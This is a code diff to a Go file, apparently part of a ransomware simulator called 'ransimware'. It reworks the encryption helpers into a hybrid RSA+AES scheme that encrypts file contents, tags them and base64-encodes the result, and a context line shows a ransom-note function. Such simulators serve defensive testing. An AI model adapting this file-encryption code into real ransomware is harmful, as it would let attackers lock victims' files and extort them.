@@ -9,6 +9,7 @@ import (
 	"crypto/rsa"
 	"crypto/sha256"
 	"encoding/base64"
+	"fmt"
 	"io"
 	"net/http"
 	"os"
@@ -41,13 +42,14 @@ func AESDecrypt(passwd string) EncryptFunc {
 		var stream cipher.Stream
 
 		if len(b) < aes.BlockSize {
-			return b, nil
+			return b, fmt.Errorf("Ciphertext too short")
 		}
 
 		if block, e = aes.NewCipher(key[:]); e != nil {
 			return b, e
 		}
 
+		// Ensure the file was encrypted with ransimware
 		for i := 0; i < aes.BlockSize; i++ {
 			if iv[i] != b[i] {
 				return b, nil
@@ -164,19 +166,59 @@ func RansomNote(path string, text []string) NotifyFunc {
 }
 
 // RSADecrypt will return a function pointer to an EncryptFunc that
-// actually decrypts using the specified private key.
+// actually decrypts using the specified private key. The private key
+// is used to decrypt an OTP used with AES for a hybrid RSA+AES
+// scheme.
 func RSADecrypt(priv *rsa.PrivateKey) EncryptFunc {
 	return func(fn string, b []byte) ([]byte, error) {
+		var b64 []byte
+		var final []byte
 		var e error
+		var key []byte
+		var n int
+		var otp []byte
 		var ptxt []byte
 
-		ptxt, e = priv.Decrypt(
+		// Base64 decode contents
+		final = make([]byte, base64.StdEncoding.DecodedLen(len(b)))
+		if _, e = base64.StdEncoding.Decode(final, b); e != nil {
+			return b, e
+		}
+
+		// Ensure the file was encrypted with ransimware
+		if string(final[:10]) != "ransimware" {
+			return b, nil
+		}
+		final = final[10:]
+
+		// Get key for AES decryption
+		for i, c := range final {
+			if c == '\n' {
+				b64 = final[:i]
+				final = final[i+1:]
+				break
+			}
+		}
+
+		// Base64 decode key
+		key = make([]byte, base64.StdEncoding.DecodedLen(len(b64)))
+		if n, e = base64.StdEncoding.Decode(key, b64); e != nil {
+			return b, e
+		}
+
+		// RSA decrypt the OTP
+		otp, e = priv.Decrypt(
 			nil,
-			b,
+			key[:n],
 			&rsa.OAEPOptions{Hash: crypto.SHA256},
 		)
 		if e != nil {
-			return b, nil
+			return b, e
+		}
+
+		// AES decrypt remaining contents using helper function
+		if ptxt, e = AESDecrypt(string(otp))(fn, final); e != nil {
+			return b, e
 		}
 
 		return ptxt, nil
@@ -184,23 +226,53 @@ func RSADecrypt(priv *rsa.PrivateKey) EncryptFunc {
 }
 
 // RSAEncrypt will return a function pointer to an EncryptFunc that
-// uses the specified public key.
+// uses the specified public key. The public key is used to encrypt an
+// OTP used with AES for a hybrid RSA+AES scheme.
 func RSAEncrypt(pub *rsa.PublicKey) EncryptFunc {
 	return func(fn string, b []byte) ([]byte, error) {
+		var b64 []byte
 		var ctxt []byte
 		var e error
+		var final []byte
+		var key []byte
+		var otp [sha256.Size]byte
 
-		ctxt, e = rsa.EncryptOAEP(
+		// Generate random OTP for AES encryption
+		if _, e = rand.Read(otp[:]); e != nil {
+			return b, e
+		}
+
+		// RSA encrypt the OTP
+		key, e = rsa.EncryptOAEP(
 			sha256.New(),
 			rand.Reader,
 			pub,
-			b,
+			otp[:],
 			nil,
 		)
 		if e != nil {
-			return b, nil
+			return b, e
 		}
 
-		return ctxt, nil
+		// Base64 encode key
+		b64 = make([]byte, base64.StdEncoding.EncodedLen(len(key)))
+		base64.StdEncoding.Encode(b64, key)
+
+		// AES encrypt using helper function
+		if ctxt, e = AESEncrypt(string(otp[:]))(fn, b); e != nil {
+			return b, e
+		}
+
+		// Create hybrid structure
+		final = []byte("ransimware")   // tag
+		final = append(final, b64...)  // RSA encrypted key + base64
+		final = append(final, '\n')    // separator
+		final = append(final, ctxt...) // AES encrypted data
+
+		// Base64 encode final ciphertext
+		b64 = make([]byte, base64.StdEncoding.EncodedLen(len(final)))
+		base64.StdEncoding.Encode(b64, final)
+
+		return b64, nil
 	}
 }
